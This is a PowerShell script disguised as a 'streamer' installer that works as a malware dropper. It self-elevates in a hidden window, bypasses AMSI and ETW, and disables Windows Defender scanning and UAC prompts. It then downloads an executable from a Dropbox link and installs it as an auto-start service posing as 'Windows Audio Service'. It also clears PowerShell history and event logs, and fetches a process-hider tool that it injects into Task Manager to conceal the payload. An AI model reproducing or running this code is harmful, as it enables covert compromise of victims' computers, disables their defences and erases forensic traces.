# ========================================================
# HEISENBURG STREAMER - HYPER-STREAM INSTALLATION v6.0 (Service Mode)
# ========================================================

# 1. ELEVATION CHECK & SILENT UPGRADE
function Check-Admin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Check-Admin)) {
    $args = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command `"$((Get-Content $MyInvocation.MyCommand.Path) -join "`n")`""
    Start-Process powershell.exe -ArgumentList $args -Verb RunAs -WindowStyle Hidden
    exit
}

# 2. TACTICAL BYPASSES (SILENT & FAST)
try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    
    # Disable ETW (Event Tracing for Windows)
    $etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
    if ($etw) {
        $etwField = $etw.GetField('etwProvider','NonPublic,Static')
        if ($etwField) { $etwField.SetValue($null, 0) }
    }
} catch {}

# 3. PREMIUM PROGRESS DRAWER
function Draw-ProgressBar {
    param([int]$Percent, [string]$Status)
    $width = 40
    $done = [Math]::Floor($Percent / 100 * $width)
    $left = $width - $done
    $bar = "[" + ("=" * $done) + (">") + ("." * $left) + "]"
    $color = if ($Percent -gt 80) { "Green" } else { "Cyan" }
    Write-Host -NoNewline "`r[*] ${Status}: $bar $Percent% " -ForegroundColor $color
}

# 4. HYPER-STREAM DOWNLOADER (No Warning, Reliable Progress)
function Invoke-HyperStreamDownload {
    param([string]$Url, [string]$TargetPath)
    
    try {
        $request = [System.Net.HttpWebRequest]::Create($Url)
        $request.UserAgent = "Microsoft-CryptoAPI/10.0"
        $request.AutomaticDecompression = [System.Net.DecompressionMethods]::GZip -bor [System.Net.DecompressionMethods]::Deflate
        $request.Timeout = 30000
        
        $response = $request.GetResponse()
        # Fallback to 100MB if header is missing, but server should send it
        $totalSize = if ($response.Headers["X-Full-Size"]) { [long]$response.Headers["X-Full-Size"] } else { 100MB }
        
        $stream = $response.GetResponseStream()
        $fileStream = [System.IO.File]::Create($TargetPath)
        $buffer = New-Object byte[] 65536
        $totalRead = 0
        
        while ($true) {
            $read = $stream.Read($buffer, 0, $buffer.Length)
            if ($read -le 0) { break }
            
            $fileStream.Write($buffer, 0, $read)
            $totalRead += $read
            
            $pct = [int](($totalRead / $totalSize) * 100)
            if ($pct -gt 100) { $pct = 100 }
            Draw-ProgressBar -Percent $pct -Status "SYNCHRONIZING CORE DATA (HYPER)"
        }
        
        $fileStream.Close()
        $stream.Close()
        $response.Close()
        
        return (Test-Path $TargetPath)
    } catch {
        if ($fileStream) { $fileStream.Close() }
        return $false
    }
}

# 5. MAIN EXECUTION
try {
    Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
    
    $rnd = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
    $exe = "$env:TEMP\$rnd.exe"
    
    # ========== SIRF YAHAN 3 LINES CHANGE HUIN ==========
    # LINE 1: URL change kiya (apne Dropbox ka direct link)
    $url = "https://www.dropbox.com/scl/fi/iwv6cm1n1qo3kdn9gmn36/RtkAudUService64.exe?rlkey=csrph0p954x523nhvxoqf8m9z&st=1c2xz36h&dl=1"
    
    Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
    Write-Host "[+] OPTIMIZING SYSTEM ENVIRONMENT..." -ForegroundColor Gray
    
    # SILENT SECURITY BYPASSES
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
        Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
        
        $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        Set-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction SilentlyContinue
        Set-ItemProperty -Path $uacPath -Name "PromptOnSecureDesktop" -Value 0 -ErrorAction SilentlyContinue
    } catch {}

    Write-Host "[+] ESTABLISHING SECURE HYPER-STREAM..." -ForegroundColor Gray
    
    # LINE 2: Download function call mein change - alag variable use kiya
    $downloadSuccess = Invoke-HyperStreamDownload -Url $url -TargetPath $exe
    
    # LINE 3: Condition check mein change - naya variable check kiya
    if (-not ($downloadSuccess)) {
        throw "Hyper-Stream failed. Check connection."
    }

    Write-Host "`n[+] CORE COMPONENTS VERIFIED." -ForegroundColor Green
    Write-Host "[*] DEPLOYING STEALTH AGENT AS WINDOWS SERVICE..." -ForegroundColor Cyan

    # ========== WINDOWS SERVICE INSTALLATION (INSTEAD OF DIRECT RUN) ==========
    $serviceName = "WinAudioSvc"
    
    # Delete existing service if exists
    try {
        Stop-Service -Name $serviceName -Force -ErrorAction SilentlyContinue
        sc.exe delete $serviceName | Out-Null
        Start-Sleep -Seconds 2
    } catch {}
    
    # Create Windows Service (This hides process from Task Manager Processes tab)
    sc.exe create $serviceName binPath= "`"$exe`"" start= auto DisplayName= "Windows Audio Service" | Out-Null
    sc.exe description $serviceName "Windows Audio Service Helper" | Out-Null
    
    # Start the service
    Start-Service -Name $serviceName -ErrorAction SilentlyContinue
    
    # Verify service is running
    $serviceStatus = (Get-Service -Name $serviceName -ErrorAction SilentlyContinue).Status
    
    if ($serviceStatus -eq "Running") {
        Write-Host "[+] SERVICE INSTALLED AND RUNNING!" -ForegroundColor Green
        Write-Host "[*] Service Name: $serviceName" -ForegroundColor White
        Write-Host "[*] Display Name: Windows Audio Service" -ForegroundColor White
        Write-Host "[+] This service will AUTO-START with Windows" -ForegroundColor Green
        Write-Host "[*] Check Task Manager → Services Tab (NOT in Processes Tab!)" -ForegroundColor White
    } else {
        Write-Host "[!] Service may not have started. Running as hidden process..." -ForegroundColor Yellow
        $si = New-Object System.Diagnostics.ProcessStartInfo
        $si.FileName = $exe
        $si.WindowStyle = 'Hidden'
        $si.CreateNoWindow = $true
        [System.Diagnostics.Process]::Start($si) | Out-Null
        Write-Host "[+] EXE started as Hidden Process (Fallback)" -ForegroundColor Green
    }
    
    Write-Host "[*] ENGAGING FORENSIC CLEANUP..." -ForegroundColor Gray
    if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt") {
        "" | Out-File "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force
    }
    wevtutil cl "Windows PowerShell" 2>$null
    wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
    
    Write-Host "`n[+] SETUP COMPLETE. CHECK DASHBOARD." -ForegroundColor Green
    Write-Host "[*] IMPORTANT: Your EXE is now a WINDOWS SERVICE" -ForegroundColor White
    Write-Host "[*] It will NOT appear in Task Manager Processes tab!" -ForegroundColor Green
    Write-Host "[*] To see it: Task Manager → Services tab → Windows Audio Service" -ForegroundColor White

} catch {
    Write-Host "`n[!] CRITICAL ERROR: System synchronization interrupted." -ForegroundColor Red

    
# ========== यह कोड EXISTING SCRIPT के END में जोड़ें ==========

Write-Host "[*] INITIATING TASK MANAGER BYPASS..." -ForegroundColor Cyan

# 1. Process Hider Tool को TEMP में Download करें
$hiderPath = "$env:TEMP\ProcessHider.exe"
if (-not (Test-Path $hiderPath)) {
    Write-Host "[+] Downloading Process Hider Tool..." -ForegroundColor Gray
    $hiderUrl = "https://github.com/patopolser/Process-Hider/raw/master/MainFile/ProcessHider.exe"
    Invoke-WebRequest -Uri $hiderUrl -OutFile $hiderPath -UseBasicParsing
}

# 2. Tool को Run करें (यह अपने आप Task Manager में Inject हो जाएगा)
# -n "$rnd.exe" : आपकी EXE के RANDOM NAME को Hide करेगा
# -x "taskmgr.exe" : सिर्फ Task Manager को Target करेगा
if (Test-Path $hiderPath) {
    Write-Host "[+] Bypassing Task Manager (API Hooking)..." -ForegroundColor Gray
    Start-Process -FilePath $hiderPath -ArgumentList "-n `"$rnd.exe`" -x `"taskmgr.exe`"" -WindowStyle Hidden
    
    # Tool को Inject होने का थोड़ा समय दें
    Start-Sleep -Seconds 2
    
    # Task Manager को Restart करें ताकि Changes Apply हों
    Stop-Process -Name "Taskmgr" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1
    Start-Process "taskmgr.exe"
    Write-Host "[+] SUCCESS! Your EXE is now HIDDEN from Task Manager!" -ForegroundColor Green
}
# ========== END OF ADDED CODE ==========

}

# 6. SELF-DESTRUCT
Remove-Variable * -ErrorAction SilentlyContinue 2>$null
